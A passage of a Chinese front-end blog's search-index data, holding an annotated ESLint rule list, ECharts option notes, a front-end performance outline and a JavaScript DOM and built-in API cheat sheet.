2,//禁止使用八进制数字\"no-octal-escape\": 2,//禁止使用八进制转义序列\"no-param-reassign\": 2,//禁止给参数重新赋值\"no-path-concat\": 0,//node中不能使用__dirname或__filename做路径拼接\"no-plusplus\": 0,//禁止使用++，--\"no-process-env\": 0,//禁止使用process.env\"no-process-exit\": 0,//禁止使用process.exit()\"no-proto\": 2,//禁止使用__proto__属性\"no-redeclare\": 2,//禁止重复声明变量\"no-regex-spaces\": 2,//禁止在正则表达式字面量中使用多个空格 /foo bar/\"no-restricted-modules\": 0,//如果禁用了指定模块，使用就会报错\"no-return-assign\": 1,//return 语句中不能有赋值表达式\"no-script-url\": 0,//禁止使用javascript:void(0)\"no-self-compare\": 2,//不能比较自身\"no-sequences\": 0,//禁止使用逗号运算符\"no-shadow\": 2,//外部作用域中的变量不能与它所包含的作用域中的变量或参数同名\"no-shadow-restricted-names\": 2,//严格模式中规定的限制标识符不能作为声明时的变量名使用\"no-spaced-func\": 2,//函数调用时 函数名与()之间不能有空格\"no-sparse-arrays\": 2,//禁止稀疏数组， [1,,2]\"no-sync\": 0,//nodejs 禁止同步方法\"no-ternary\": 0,//禁止使用三目运算符\"no-trailing-spaces\": 1,//一行结束后面不要有空格\"no-this-before-super\": 0,//在调用super()之前不能使用this或super\"no-throw-literal\": 2,//禁止抛出字面量错误 throw \"error\";\"no-undef\": 1,//不能有未定义的变量\"no-undef-init\": 2,//变量初始化时不能直接给它赋值为undefined\"no-undefined\": 2,//不能使用undefined\"no-unexpected-multiline\": 2,//避免多行表达式\"no-underscore-dangle\": 1,//标识符不能以_开头或结尾\"no-unneeded-ternary\": 2,//禁止不必要的嵌套 var isYes = answer === 1 ? true : false;\"no-unreachable\": 2,//不能有无法执行的代码\"no-unused-expressions\": 2,//禁止无用的表达式\"no-unused-vars\": [2, &#123;\"vars\": \"all\", \"args\": \"after-used\"&#125;],//不能有声明后未被使用的变量或参数\"no-use-before-define\": 2,//未定义前不能使用\"no-useless-call\": 2,//禁止不必要的call和apply\"no-void\": 2,//禁用void操作符\"no-var\": 0,//禁用var，用let和const代替\"no-warning-comments\": [1, &#123; \"terms\": [\"todo\", \"fixme\", \"xxx\"], \"location\": \"start\" &#125;],//不能有警告备注\"no-with\": 2,//禁用with\"array-bracket-spacing\": [2, \"never\"],//是否允许非空数组里面有多余的空格\"arrow-parens\": 0,//箭头函数用小括号括起来\"arrow-spacing\": 0,//=&gt;的前/后括号\"accessor-pairs\": 0,//在对象中使用getter/setter\"block-scoped-var\": 0,//块语句中使用var\"brace-style\": [1, \"1tbs\"],//大括号风格\"callback-return\": 1,//避免多次调用回调什么的\"camelcase\": 2,//强制驼峰法命名\"comma-dangle\": [2, \"never\"],//对象字面量项尾不能有逗号\"comma-spacing\": 0,//逗号前后的空格\"comma-style\": [2, \"last\"],//逗号风格，换行时在行首还是行尾\"complexity\": [0, 11],//循环复杂度\"computed-property-spacing\": [0, \"never\"],//是否允许计算后的键名什么的\"consistent-return\": 0,//return 后面是否允许省略\"consistent-this\": [2, \"that\"],//this别名\"constructor-super\": 0,//非派生类不能调用super，派生类必须调用super\"curly\": [2, \"all\"],//必须使用 if()&#123;&#125; 中的&#123;&#125;\"default-case\": 2,//switch语句最后必须有default\"dot-location\": 0,//对象访问符的位置，换行的时候在行首还是行尾\"dot-notation\": [0, &#123; \"allowKeywords\": true &#125;],//避免不必要的方括号\"eol-last\": 0,//文件以单一的换行符结束\"eqeqeq\": 2,//必须使用全等\"func-names\": 0,//函数表达式必须有名字\"func-style\": [0, \"declaration\"],//函数风格，规定只能使用函数声明/函数表达式\"generator-star-spacing\": 0,//生成器函数*的前后空格\"guard-for-in\": 0,//for in循环要用if语句过滤\"handle-callback-err\": 0,//nodejs 处理错误\"id-length\": 0,//变量名长度\"indent\": [2, 4],//缩进风格\"init-declarations\": 0,//声明时必须赋初值\"key-spacing\": [0, &#123; \"beforeColon\": false, \"afterColon\": true &#125;],//对象字面量中冒号的前后空格\"lines-around-comment\": 0,//行前/行后备注\"max-depth\": [0, 4],//嵌套块深度\"max-len\": [0, 80, 4],//字符串最大长度\"max-nested-callbacks\": [0, 2],//回调嵌套深度\"max-params\": [0, 3],//函数最多只能有3个参数\"max-statements\": [0, 10],//函数内最多有几个声明\"new-cap\": 2,//函数名首行大写必须使用new方式调用，首行小写必须用不带new方式调用\"new-parens\": 2,//new时必须加小括号\"newline-after-var\": 2,//变量声明后是否需要空一行\"object-curly-spacing\": [0, \"never\"],//大括号内是否允许不必要的空格\"object-shorthand\": 0,//强制对象字面量缩写语法\"one-var\": 1,//连续声明\"operator-assignment\": [0, \"always\"],//赋值运算符 += -=什么的\"operator-linebreak\": [2, \"after\"],//换行时运算符在行尾还是行首\"padded-blocks\": 0,//块语句内行首行尾是否要空行\"prefer-const\": 0,//首选const\"prefer-spread\": 0,//首选展开运算\"prefer-reflect\": 0,//首选Reflect的方法\"quotes\": [1, \"single\"],//引号类型 `` \"\" ''\"quote-props\":[2, \"always\"],//对象字面量中的属性名是否强制双引号\"radix\": 2,//parseInt必须指定第二个参数\"id-match\": 0,//命名检测\"require-yield\": 0,//生成器函数必须有yield\"semi\": [2, \"always\"],//语句强制分号结尾\"semi-spacing\": [0, &#123;\"before\": false, \"after\": true&#125;],//分号前后空格\"sort-vars\": 0,//变量声明时排序\"space-after-keywords\": [0, \"always\"],//关键字后面是否要空一格\"space-before-blocks\": [0, \"always\"],//不以新行开始的块&#123;前面要不要有空格\"space-before-function-paren\": [0, \"always\"],//函数定义时括号前面要不要有空格\"space-in-parens\": [0, \"never\"],//小括号里面要不要有空格\"space-infix-ops\": 0,//中缀操作符周围要不要有空格\"space-return-throw-case\": 2,//return throw case后面要不要加空格\"space-unary-ops\": [0, &#123; \"words\": true, \"nonwords\": false &#125;],//一元运算符的前/后要不要加空格\"spaced-comment\": 0,//注释风格要不要有空格什么的\"strict\": 2,//使用严格模式\"use-isnan\": 2,//禁止比较时使用NaN，只能用isNaN()\"valid-jsdoc\": 0,//jsdoc规则\"valid-typeof\": 2,//必须使用合法的typeof的值\"vars-on-top\": 2,//var必须放在作用域顶部\"wrap-iife\": [2, \"inside\"],//立即执行函数表达式的小括号风格\"wrap-regex\": 0,//正则表达式字面量用小括号包起来\"yoda\": [2, \"never\"]//禁止尤达条件","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"前端规范","slug":"前端规范","permalink":"https://ru23.com/tags/前端规范/"},{"name":"eslint","slug":"eslint","permalink":"https://ru23.com/tags/eslint/"}]},{"title":"移动设备分辨率预览","slug":"2018-01-mobile-device-size","date":"2018-01-27T13:20:43.000Z","updated":"2018-10-24T03:46:02.342Z","comments":true,"path":"note/e7c5f8dd.html","link":"","permalink":"https://ru23.com/note/e7c5f8dd.html","excerpt":"","text":"来源 https://www.paintcodeapp.com/news/ultimate-guide-to-iphone-resolutions image.png","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"移动端","slug":"移动端","permalink":"https://ru23.com/tags/移动端/"},{"name":"适配","slug":"适配","permalink":"https://ru23.com/tags/适配/"}]},{"title":"图解前端性能优化","slug":"2018-01-fed-performance-optimization","date":"2018-01-12T03:24:03.000Z","updated":"2018-10-24T03:46:02.336Z","comments":true,"path":"note/fa4a006c.html","link":"","permalink":"https://ru23.com/note/fa4a006c.html","excerpt":"","text":"一、css和js的装载与执行1.1 HTML 页面加载渲染的过程 image.png 1.2 HTML渲染过程的一些特点 image.png 1.3 css 阻塞和 js 阻塞1.3.1 CSS阻塞 image.png 1.3.2 JS阻塞 image.png 二、资源的压缩与合并2.1 文件合并 image.png 2.2 css、js 及 HTML压缩2.2.1 CSS压缩 image.png 2.2.2 JS压缩 image.png 2.2.3 HTML压缩 image.png 2.3 http 清求的过程及潜在的性能优化点 image.png image.png 三、图片相关的优化3.1 不同格式图片常用的业务场景 image.png 3.2 图片压缩几种方法-雪碧图、Image inline3.2.1 使用矢量图 image.png 3.2.2 在安卓下使用webp image.png 四、 懒加载与预加载4.1 懒加载原理 image.png 4.2 预加载原理 image.png 4.3 懒加载、预加载使用场景 image.png image.png image.png image.png 4.4 预加载原生 js 和 PreloadJS 实现 image.png image.png 五、缓存 image.png image.png image.png image.png image.png image.png image.png image.png image.png image.png image.png image.png 六、重绘与回流6.1 什么是重绘与回流6.1.1 重绘 image.png 6.1.2 回流 image.png image.png 6.2 避免重绘回流的两种方法 image.png image.png image.png image.png 6.3 css 性能让 Javacript 变慢？ image.png 6.4 案例解析-重绘、回流及图层 image.png image.png image.png image.png image.png image.png image.png 6.5 实战优化点总结 image.png 七、浏览器存储7.1 cookies image.png image.png image.png image.png image.png image.png image.png 7.2 LocalStorage、SessionStorage7.2.1 LocalStorage image.png 7.2.2 SessionStorage image.png 7.3 IndexedDB image.png 7.4 案例解析 image.png image.png image.png 7.5 PWA与Service Workers7.5.1 PWA image.png 7.5.2 Service Workers image.png image.png image.png 7.6 Service Workers-离线应用 image.png image.png 八、移动H5前端性能优化指南","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"性能优化","slug":"性能优化","permalink":"https://ru23.com/tags/性能优化/"}]},{"title":"echart使用小结","slug":"2018-01-echart","date":"2018-01-12T02:05:43.000Z","updated":"2018-10-24T03:46:02.288Z","comments":true,"path":"note/84c8c02e.html","link":"","permalink":"https://ru23.com/note/84c8c02e.html","excerpt":"","text":"十一个组件选项主要用来进行交互 一、Timeline选项 时间轴，每个图表最多仅有一个时间轴控件 image.png 二、Title选项 每个图表最多仅有一个标题控件，每个标题控件可设主副标题 可以对标题文字的大小样式进行设置 image.png 三、toolbox 工具箱，每个图表最多仅有一个工具箱。工具箱里面可以实现图表类型的切换，保存图片，刷新，查看数据等功能。可以对其像素进行设置 image.png 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123&#123; mark : &#123; show : false, title : &#123; mark : '辅助线开关', markUndo : '删除辅助线', markClear : '清空辅助线' &#125;, lineStyle : &#123; width : 2, color : '#1e90ff', type : 'dashed' &#125; &#125;, dataZoom : &#123; show : false, title : &#123; dataZoom : '区域缩放', dataZoomReset : '区域缩放后退' &#125; &#125;, dataView : &#123; show : false, title : '数据视图', readOnly: false, lang: ['数据视图', '关闭', '刷新'] &#125;, magicType: &#123; show : false, title : &#123; line : '折线图切换', bar : '柱形图切换', stack : '堆积', tiled : '平铺', force: '力导向布局图切换', chord: '和弦图切换', pie: '饼图切换', funnel: '漏斗图切换' &#125;, option: &#123; // line: &#123;...&#125;, // bar: &#123;...&#125;, // stack: &#123;...&#125;, // tiled: &#123;...&#125;, // force: &#123;...&#125;, // chord: &#123;...&#125;, // pie: &#123;...&#125;, // funnel: &#123;...&#125; &#125;, type : [] &#125;, restore : &#123; show : false, title : '还原' &#125;, saveAsImage : &#123; show : false, title : '保存为图片', type : 'png', lang : ['点击保存'] &#125;&#125; 四、tooltip 提示框，鼠标悬浮交互时的信息提示 image.png 五、legend 图例，每个图表最多仅有一个图例，混搭图表共享 image.png 六、dataRange 值域选择，每个图表最多仅有一个值域控件 image.png 七、dataZoom 数据区域缩放。与toolbox.feature.dataZoom同步，仅对直角坐标系图表有效 roamController 缩放漫游组件，仅对地图有效 image.png 八、grid 直角坐标系内绘图网格 image.png 九、xAxis 直角坐标系中横轴数组，数组中每一项代表一条横轴坐标轴，仅有一条时可省略数组。最多同时存在2条横轴，单条横轴时可指定安放于grid的底部（默认）或顶部，2条同时存在时位置互斥，默认第一条安放于底部，第二条安放于顶部 十、yAxis 直角坐标系中纵轴数组，数组中每一项代表一条纵轴坐标轴，仅有一条时可省略数组。最多同时存在2条纵轴，单条纵轴时可指定安放于grid的左侧（默认）或右侧，2条同时存在时位置互斥，默认第一条安放于左侧，第二条安放于右侧 坐标轴有三种类型，类目型、数值型和时间型，纵轴通常为数值型，但条形图时则纵轴为类目型 十一、series（通用） 驱动图表生成的数据内容数组，数组中每一项为一个系列的选项及数据，其中个别选项仅在部分图表类型中有效，请注意适用类型","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Echart","slug":"Echart","permalink":"https://ru23.com/tags/Echart/"}]},{"title":"JavaScript常用API合集","slug":"2017-12-js-api","date":"2017-12-24T03:10:43.000Z","updated":"2018-10-24T06:57:47.637Z","comments":true,"path":"note/c5d4add4.html","link":"","permalink":"https://ru23.com/note/c5d4add4.html","excerpt":"","text":"来源于互联网 一、节点1.1 节点属性 1234567891011121314151617181920Node.nodeName //返回节点名称，只读Node.nodeType //返回节点类型的常数值，只读Node.nodeValue //返回Text或Comment节点的文本值，只读Node.textContent //返回当前节点和它的所有后代节点的文本内容，可读写Node.baseURI //返回当前网页的绝对路径Node.ownerDocument //返回当前节点所在的顶层文档对象，即documentNode.nextSibling //返回紧跟在当前节点后面的第一个兄弟节点Node.previousSibling //返回当前节点前面的、距离最近的一个兄弟节点Node.parentNode //返回当前节点的父节点Node.parentElement //返回当前节点的父Element节点Node.childNodes //返回当前节点的所有子节点Node.firstChild //返回当前节点的第一个子节点Node.lastChild //返回当前节点的最后一个子节点//parentNode接口Node.children //返回指定节点的所有Element子节点Node.firstElementChild //返回当前节点的第一个Element子节点Node.lastElementChild //返回当前节点的最后一个Element子节点Node.childElementCount //返回当前节点所有Element子节点的数目。 1.2 操作 12345678910111213141516Node.appendChild(node) //向节点添加最后一个子节点Node.hasChildNodes() //返回布尔值，表示当前节点是否有子节点Node.cloneNode(true); // 默认为false(克隆节点), true(克隆节点及其属性，以及后代)Node.insertBefore(newNode,oldNode) // 在指定子节点之前插入新的子节点Node.removeChild(node) //删除节点，在要删除节点的父节点上操作Node.replaceChild(newChild,oldChild) //替换节点Node.contains(node) //返回一个布尔值，表示参数节点是否为当前节点的后代节点。Node.compareDocumentPosition(node) //返回一个7个比特位的二进制值，表示参数节点和当前节点的关系Node.isEqualNode(noe) //返回布尔值，用于检查两个节点是否相等。所谓相等的节点，指的是两个节点的类型相同、属性相同、子节点相同。Node.normalize() //用于清理当前节点内部的所有Text节点。它会去除空的文本节点，并且将毗邻的文本节点合并成一个。//ChildNode接口Node.remove() //用于删除当前节点Node.before() //Node.after()Node.replaceWith() 1.3 Document节点 1.3.1 Document节点的属性 12345678910111213141516171819202122232425262728document.doctype //document.documentElement //返回当前文档的根节点document.defaultView //返回document对象所在的window对象document.body //返回当前文档的&lt;body&gt;节点document.head //返回当前文档的&lt;head&gt;节点document.activeElement //返回当前文档中获得焦点的那个元素。//节点集合属性document.links //返回当前文档的所有a元素document.forms //返回页面中所有表单元素document.images //返回页面中所有图片元素document.embeds //返回网页中所有嵌入对象document.scripts //返回当前文档的所有脚本document.styleSheets //返回当前网页的所有样式表//文档信息属性document.documentURI //表示当前文档的网址document.URL //返回当前文档的网址document.domain //返回当前文档的域名document.lastModified //返回当前文档最后修改的时间戳document.location //返回location对象，提供当前文档的URL信息document.referrer //返回当前文档的访问来源document.title //返回当前文档的标题document.characterSet属性返回渲染当前文档的字符集，比如UTF-8、ISO-8859-1。document.readyState //返回当前文档的状态document.designMode //控制当前文档是否可编辑，可读写document.compatMode //返回浏览器处理文档的模式document.cookie //用来操作Cookie 1.3.2 Document节点的方法 （1）读写方法 1234document.open() //用于新建并打开一个文档document.close() //不安比open方法所新建的文档document.write() //用于向当前文档写入内容document.writeIn() //用于向当前文档写入内容，尾部添加换行符。 （2）查找节点 1234567document.querySelector(selectors) //接受一个CSS选择器作为参数，返回第一个匹配该选择器的元素节点。document.querySelectorAll(selectors) //接受一个CSS选择器作为参数，返回所有匹配该选择器的元素节点。document.getElementsByTagName(tagName) //返回所有指定HTML标签的元素document.getElementsByClassName(className) //返回包括了所有class名字符合指定条件的元素document.getElementsByName(name) //用于选择拥有name属性的HTML元素（比如&lt;form&gt;、&lt;radio&gt;、&lt;img&gt;、&lt;frame&gt;、&lt;embed&gt;和&lt;object&gt;等）document.getElementById(id) //返回匹配指定id属性的元素节点。document.elementFromPoint(x,y) //返回位于页面指定位置最上层的Element子节点。 （3）生成节点 1234document.createElement(tagName) //用来生成HTML元素节点。document.createTextNode(text) //用来生成文本节点document.createAttribute(name) //生成一个新的属性对象节点，并返回它。document.createDocumentFragment() //生成一个DocumentFragment对象 （4）事件方法 1234document.createEvent(type) //生成一个事件对象，该对象能被element.dispatchEvent()方法使用document.addEventListener(type,listener,capture) //注册事件document.removeEventListener(type,listener,capture) //注销事件document.dispatchEvent(event) //触发事件 （5）其他 123document.hasFocus() //返回一个布尔值，表示当前文档之中是否有元素被激活或获得焦点。document.adoptNode(externalNode) //将某个节点，从其原来所在的文档移除，插入当前文档，并返回插入后的新节点。document.importNode(externalNode, deep) //从外部文档拷贝指定节点，插入当前文档。 1.4 Element节点 1.4.1 Element节点的属性 （1）特性属性 12345678Element.attributes //返回当前元素节点的所有属性节点Element.id //返回指定元素的id属性，可读写Element.tagName //返回指定元素的大写标签名Element.innerHTML //返回该元素包含的HTML代码，可读写Element.outerHTML //返回指定元素节点的所有HTML代码，包括它自身和包含的的所有子元素，可读写Element.className //返回当前元素的class属性，可读写Element.classList //返回当前元素节点的所有class集合Element.dataset //返回元素节点中所有的data-*属性。 （2）尺寸属性 12345678910111213Element.clientHeight //返回元素节点可见部分的高度Element.clientWidth //返回元素节点可见部分的宽度Element.clientLeft //返回元素节点左边框的宽度Element.clientTop //返回元素节点顶部边框的宽度Element.scrollHeight //返回元素节点的总高度Element.scrollWidth //返回元素节点的总宽度Element.scrollLeft //返回元素节点的水平滚动条向右滚动的像素数值,通过设置这个属性可以改变元素的滚动位置Element.scrollTop //返回元素节点的垂直滚动向下滚动的像素数值Element.offsetHeight //返回元素的垂直高度(包含border,padding)Element.offsetWidth //返回元素的水平宽度(包含border,padding)Element.offsetLeft //返回当前元素左上角相对于Element.offsetParent节点的垂直偏移Element.offsetTop //返回水平位移Element.style //返回元素节点的行内样式 （3）节点相关属性 1234567Element.children //包括当前元素节点的所有子元素Element.childElementCount //返回当前元素节点包含的子HTML元素节点的个数Element.firstElementChild //返回当前节点的第一个Element子节点 Element.lastElementChild //返回当前节点的最后一个Element子节点 Element.nextElementSibling //返回当前元素节点的下一个兄弟HTML元素节点Element.previousElementSibling //返回当前元素节点的前一个兄弟HTML节点Element.offsetParent //返回当前元素节点的最靠近的、并且CSS的position属性不等于static的父元素。 1.4.2 Element节点的方法 （1）位置方法 1234567891011121314151617getBoundingClientRect() // getBoundingClientRect返回一个对象，包含top,left,right,bottom,width,height // width、height 元素自身宽高// top 元素上外边界距窗口最上面的距离// right 元素右外边界距窗口最上面的距离// bottom 元素下外边界距窗口最上面的距离// left 元素左外边界距窗口最上面的距离// width 元素自身宽(包含border,padding) // height 元素自身高(包含border,padding) getClientRects() //返回当前元素在页面上形参的所有矩形。// 元素在页面上的偏移量 var rect = el.getBoundingClientRect() return &#123; top: rect.top + document.body.scrollTop, left: rect.left + document.body.scrollLeft &#125; （2）属性方法 1234Element.getAttribute()：读取指定属性 Element.setAttribute()：设置指定属性 Element.hasAttribute()：返回一个布尔值，表示当前元素节点是否有指定的属性 Element.removeAttribute()：移除指定属性 （3）查找方法 1234Element.querySelector() Element.querySelectorAll() Element.getElementsByTagName() Element.getElementsByClassName() （4）事件方法 1234567891011121314151617181920Element.addEventListener()：添加事件的回调函数 Element.removeEventListener()：移除事件监听函数 Element.dispatchEvent()：触发事件//ie8Element.attachEvent(oneventName,listener)Element.detachEvent(oneventName,listener)// event对象 var event = window.event||event; // 事件的目标节点 var target = event.target || event.srcElement;// 事件代理 ul.addEventListener('click', function(event) &#123; if (event.target.tagName.toLowerCase() === 'li') &#123; console.log(event.target.innerHTML) &#125; &#125;); （5）其他 1234567891011Element.scrollIntoView() //滚动当前元素，进入浏览器的可见区域//解析HTML字符串，然后将生成的节点插入DOM树的指定位置。Element.insertAdjacentHTML(where, htmlString); Element.insertAdjacentHTML('beforeBegin', htmlString); // 在该元素前插入 Element.insertAdjacentHTML('afterBegin', htmlString); // 在该元素第一个子元素前插入 Element.insertAdjacentHTML('beforeEnd', htmlString); // 在该元素最后一个子元素后面插入 Element.insertAdjacentHTML('afterEnd', htmlString); // 在该元素后插入Element.remove() //用于将当前元素节点从DOM中移除Element.focus() //用于将当前页面的焦点，转移到指定元素上 二、CSS操作（1）类名操作 12345678910111213141516171819//ie8以下Element.className //获取元素节点的类名Element.className += ' ' + newClassName //新增一个类名//判断是否有某个类名function hasClass(element,className)&#123; return new RegExp(className,'gi').test(element.className);&#125;//移除classfunction removeClass(element,className)&#123; element.className = element.className.replace(new RegExp('(^|\\\\b)' + className.split(' ').join('|') + '(\\\\b|$)', 'gi'),'');&#125;//ie10 element.classList.add(className) //新增element.classList.remove(className) //删除element.classList.contains(className) //是否包含element.classList.toggle(className) //toggle class （2）style操作 1234567891011121314151617element.setAttribute('style','')element.style.backgroundColor = 'red'element.style.cssText //用来读写或删除整个style属性element.style.setProperty(propertyName,value) //设置css属性element.style.getPropertyValue(property) //获取css属性element.style.removeProperty(property) //删除css属性操作非内联样式//ie8element.currentStyle[attrName]//ie9+window.getComputedStyle(el,null)[attrName] window.getComputedStyle(el,null).getPropertyValue(attrName)//伪类window.getComputedStyle(el,':after')[attrName] 三、对象3.1 Object对象 （1）生成实例对象 1var o = new Object() （2）属性 1Object.prototype //返回原型对象 （3）方法 12Object.keys(o) //遍历对象的可枚举属性Object.getOwnPropertyName(o) //遍历对象不可枚举的属性 对象实例的方法 123456valueOf()：返回当前对象对应的值。 toString()：返回当前对象对应的字符串形式。 toLocaleString()：返回当前对象对应的本地字符串形式。 hasOwnProperty()：判断某个属性是否为当前对象自身的属性，还是继承自原型对象的属性。 isPrototypeOf()：判断当前对象是否为另一个对象的原型。propertyIsEnumerable()：判断某个属性是否可枚举。 3.2 Array对象 （1）生成实例对象 1var a = new Array() （2）属性 1a.length //长度 （3）Array.isArray() 1Array.isArray(a) //用来判断一个值是否为数组 （4）Array实例的方法 12345678910111213141516171819202122a.valueof() //返回数组本身a.toString() //返回数组的字符串形式a.push(value,vlaue....) //用于在数组的末端添加一个或多个元素，并返回添加新元素后的数组长度。pop() //用于删除数组的最后一个元素，并返回该元素join() //以参数作为分隔符，将所有数组成员组成一个字符串返回。如果不提供参数，默认用逗号分隔。concat() //用于多个数组的合并。它将新数组的成员，添加到原数组的尾部，然后返回一个新数组，原数组不变。shift() //用于删除数组的第一个元素，并返回该元素。unshift(value) //用于在数组的第一个位置添加元素，并返回添加新元素后的数组长度。reverse() //用于颠倒数组中元素的顺序，返回改变后的数组slice(start_index, upto_index); //用于提取原数组的一部分，返回一个新数组，原数组不变。第一个参数为起始位置（从0开始），第二个参数为终止位置（但该位置的元素本身不包括在内）。如果省略第二个参数，则一直返回到原数组的最后一个成员。负数表示倒数第几个。splice(index, count_to_remove, addElement1, addElement2, ...); //用于删除原数组的一部分成员，并可以在被删除的位置添加入新的数组成员，返回值是被删除的元素。第一个参数是删除的起始位置，第二个参数是被删除的元素个数。如果后面还有更多的参数，则表示这些就是要被插入数组的新元素。sort() //对数组成员进行排序，默认是按照字典顺序排序。排序后，原数组将被改变。如果想让sort方法按照自定义方式排序，可以传入一个函数作为参数，表示按照自定义方法进行排序。该函数本身又接受两个参数，表示进行比较的两个元素。如果返回值大于0，表示第一个元素排在第二个元素后面；其他情况下，都是第一个元素排在第二个元素前面。map() //对数组的所有成员依次调用一个函数，根据函数结果返回一个新数组。map(elem,index,arr) //map方法接受一个函数作为参数。该函数调用时，map方法会将其传入三个参数，分别是当前成员、当前位置和数组本身。forEach() //遍历数组的所有成员，执行某种操作,参数是一个函数。它接受三个参数，分别是当前位置的值、当前位置的编号和整个数组。filter() //参数是一个函数，所有数组成员依次执行该函数，返回结果为true的成员组成一个新数组返回。该方法不会改变原数组。some() //用来判断数组成员是否符合某种条件。接受一个函数作为参数，所有数组成员依次执行该函数，返回一个布尔值。该函数接受三个参数，依次是当前位置的成员、当前位置的序号和整个数组。只要有一个数组成员的返回值是true，则整个some方法的返回值就是true，否则false。every() //用来判断数组成员是否符合某种条件。接受一个函数作为参数，所有数组成员依次执行该函数，返回一个布尔值。该函数接受三个参数，依次是当前位置的成员、当前位置的序号和整个数组。所有数组成员的返回值都是true，才返回true，否则false。reduce() //依次处理数组的每个成员，最终累计为一个值。从左到右处理（从第一个成员到最后一个成员）reduceRight() //依次处理数组的每个成员，最终累计为一个值。从右到左（从最后一个成员到第一个成员）indexOf(s) //返回给定元素在数组中第一次出现的位置，如果没有出现则返回-1。可以接受第二个参数，表示搜索的开始位置lastIndexOf() //返回给定元素在数组中最后一次出现的位置，如果没有出现则返回-1。 3.3 Number对象 （1）生成对象 1var n = new Number() （2）Number对象的属性 1234567Number.POSITIVE_INFINITY：正的无限，指向Infinity。 Number.NEGATIVE_INFINITY：负的无限，指向-Infinity。 Number.NaN：表示非数值，指向NaN。 Number.MAX_VALUE：表示最大的正数，相应的，最小的负数为-Number.MAX_VALUE。 Number.MIN_VALUE：表示最小的正数（即最接近0的正数，在64位浮点数体系中为5e-324），相应的，最接近0的负数为-Number.MIN_VALUE。 Number.MAX_SAFE_INTEGER：表示能够精确表示的最大整数，即9007199254740991。 Number.MIN_SAFE_INTEGER：表示能够精确表示的最小整数，即-9007199254740991。 （4）Number对象实例的方法 1234toString() //用来将一个数值转为字符串形式.可以接受一个参数，表示输出的进制。如果省略这个参数，默认将数值先转为十进制，再输出字符串；否则，就根据参数指定的进制，将一个数字转化成某个进制的字符串。toFixed() //用于将一个数转为指定位数的小数，返回这个小数对应的字符串。toExponential() //用于将一个数转为科学计数法形式。可传入一个参数，参数表示小数点后有效数字的位数，范围为0到20，超出这个范围，会抛出一个RangeError。toPrecision() //用于将一个数转为指定位数的有效数字。 3.4 String 对象 （1）生成实例对象 1var s = new String() （2）String对象的属性 1s.length //返回字符串的长度 （3）方法 1234567891011121314151617s.chatAt(index) //返回指定位置的字符s.fromCharCode() //该方法的参数是一系列Unicode码点，返回对应的字符串。s.charCodeAt(index) //返回给定位置字符的Unicode码点（十进制表示）s.concat(s2) //用于连接两个字符串s.slice(start,end) //用于从原字符串取出子字符串并返回，不改变原字符串。第一个参数是子字符串的开始位置，第二个参数是子字符串的结束位置（不含该位置）。如果参数是负值，表示从结尾开始倒数计算的位置，即该负值加上字符串长度。s.substring(start,end) //用于从原字符串取出子字符串并返回，不改变原字符串.第一个参数表示子字符串的开始位置，第二个位置表示结束位置。s.substr(start,length) //用于从原字符串取出子字符串并返回，不改变原字符串。第一个参数是子字符串的开始位置，第二个参数是子字符串的长度。如果第一个参数是负数，表示倒数计算的字符位置。如果第二个参数是负数，将被自动转为0，因此会返回空字符串。s.indexOf(s) //返回给定元素在字符串中第一次出现的位置，如果没有出现则返回-1。可以接受第二个参数，表示搜索的开始位置 s.lastIndexOf() //返回给定元素在字符串中最后一次出现的位置，如果没有出现则返回-1。s.trim() //用于去除字符串两端的空格，返回一个新字符串s.toLowerCase() //用于将一个字符串全部转为小写,返回一个新字符串，不改变原字符串。s.toUpperCase() //全部转为大写s.localeCompare(s2) //用于比较两个字符串。它返回一个整数，如果小于0，表示第一个字符串小于第二个字符串；如果等于0，表示两者相等；如果大于0，表示第一个字符串大于第二个字符串。s.match(regexp) //用于确定原字符串是否匹配某个子字符串，返回一个数组，成员为匹配的第一个字符串。如果没有找到匹配，则返回null。s.search() //返回值为匹配的第一个位置。如果没有找到匹配，则返回-1。s.replace(oldValue,newValue) //用于替换匹配的子字符串，一般情况下只替换第一个匹配（除非使用带有g修饰符的正则表达式）。s.split() //按照给定规则分割字符串，返回一个由分割出来的子字符串组成的数组。还可传入第二个参数，决定了返回数组的成员数。 3.5 Math对象 （1）属性 12345678Math.E：常数e。 Math.LN2：2的自然对数。 Math.LN10：10的自然对数。 Math.LOG2E：以2为底的e的对数。 Math.LOG10E：以10为底的e的对数。 Math.PI：常数Pi。 Math.SQRT1_2：0.5的平方根。 Math.SQRT2：2的平方根。 （2）数学方法 1234567891011Math.abs()：返回参数的绝对值 Math.ceil()：向上取整，接受一个参数，返回大于该参数的最小整数。 Math.floor()：向下取整 Math.max(n,n1,...)：可接受多个参数，返回最大值 Math.min(n,n1,..)：可接受多个参数，返回最小值 Math.pow(n,e)：指数运算, 返回以第一个参数为底数、第二个参数为幂的指数值。 Math.sqrt()：返回参数值的平方根。如果参数是一个负值，则返回NaN。 Math.log()：返回以e为底的自然对数值。Math.exp()：返回e的指数，也就是常数e的参数次方。Math.round()：四舍五入 Math.random()：返回0到1之间的一个伪随机数，可能等于0，但是一定小于1。 （3）三角函数方法 123456Math.sin()：返回参数的正弦 Math.cos()：返回参数的余弦 Math.tan()：返回参数的正切 Math.asin()：返回参数的反正弦（弧度值） Math.acos()：返回参数的反余弦（弧度值） Math.atan()：返回参数的反正切（弧度值） 3.6 JSON对象 （1）方法 123456JSON.stringify() //用于将一个值转为字符串。该字符串应该符合JSON格式，并且可以被JSON.parse方法还原。//（JSON.stringify(obj, selectedProperties)）还可以接受一个数组，作为第二个参数，指定需要转成字符串的属性。//还可以接受第三个参数，用于增加返回的JSON字符串的可读性。如果是数字，表示每个属性前面添加的空格（最多不超过10个）；如果是字符串（不超过10个字符），则该字符串会添加在每行前面。JSON.parse() //用于将JSON字符串转化成对象。 3.7 console对象 （1）方法 1234567891011121314151617181920212223242526console.log(text,text2,...) //用于在console窗口输出信息。它可以接受多个参数，将它们的结果连接起来输出。如果第一个参数是格式字符串（使用了格式占位符），console.log方法将依次用后面的参数替换占位符，然后再进行输出。console.info() 